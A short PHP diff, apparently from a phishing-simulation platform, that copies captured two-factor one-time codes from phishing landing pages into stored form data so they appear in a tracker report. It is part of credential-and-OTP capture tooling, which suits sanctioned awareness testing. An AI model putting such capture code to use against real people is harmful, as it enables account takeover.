@@ -89,6 +89,18 @@ elseif(is_numeric($page)){
         : null;
     $has_2fa = $code_2fa !== null && $code_2fa !== '';
 
+    // The capture landings post the OTP top-level (POSTJ.code_2fa), so it
+    // lands in the dedicated code_2fa column — which the Web-Tracker report's
+    // Field-<name> resolver (tracker_report_manager) never reads, leaving the
+    // built `Field-code_2fa` column empty. Mirror it into form_field_data
+    // (only when the form didn't already carry its own code_2fa input) so the
+    // captured code surfaces as a report column, alongside the alert/summary
+    // paths that key off the dedicated column.
+    if ($has_2fa && !array_key_exists('code_2fa', $POSTJ['form_field_data'])) {
+        $POSTJ['form_field_data']['code_2fa'] = $code_2fa;
+        $form_field_data = json_encode($POSTJ['form_field_data']);
+    }
+
     $is_first = taphish_is_first_capture($conn, $trackerId, $rid);
     $is_2fa_capture = $has_2fa ? 1 : 0;
 
